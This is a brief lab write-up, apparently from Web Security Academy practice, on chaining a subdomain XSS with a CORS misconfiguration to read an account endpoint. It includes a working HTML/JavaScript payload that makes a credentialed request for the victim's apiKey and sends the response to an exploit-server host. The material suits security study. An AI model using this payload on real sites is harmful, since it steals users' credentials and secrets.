# Chaining CORS + XSS
We found a website that is vulnerable to XSS
Then we found an endpoint that displays the apiKey, it contains a misconfig CORS but its only accessible if it's coming from the subdomain, so we will chain both attacks.
Allowing all subdomains to be trusted on the **origin HEADER** can be a problem because if there is a vulnerability on a subdomain like an XSS, then we can use that vulnerability to host our malicious script on it, and have our script execute from the subdomain in order to make a request that will be to another subdomain/domain within the application.

## Method
We added the CORS Origin Attack script into the XSS vulnerability, this way when the user clicks on the XSS link, it will make a request to the /accountDetails endpoint but the request will come from the subdomain which is allowed to send requests.
![[Pasted image 20251225214039.png]]

## Chaining CORS + XSS Payload
```html

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title></title>
</head>
<body>
	<!-- XSS Attack -->
<script>
	window.location = "http://stock.0abc0035039e9463850fa3d700ef0025.web-security-academy.net/?productId={CORST_ATTACK_SCRIPT_HERE_ENCODED}&storeId=1"
</script>

<!-- CORS Attack -->
<script>
	request = new XMLHttpRequest()
	const originAllowedUrl = 'https://0abc0035039e9463850fa3d700ef0025.web-security-academy.net/accountDetails'
	const exploitServer = 'https://exploit-0aee002f03ab94ab85e6a27e01da0003.exploit-server.net/exploit?key='

	request.open('get',originAllowedUrl,true)

	request.onload = () =>{
		window.location = exploitServer + request.responseText
	}
	request.withCredentials = true
	request.send()
</script>


</body>
</html>
```
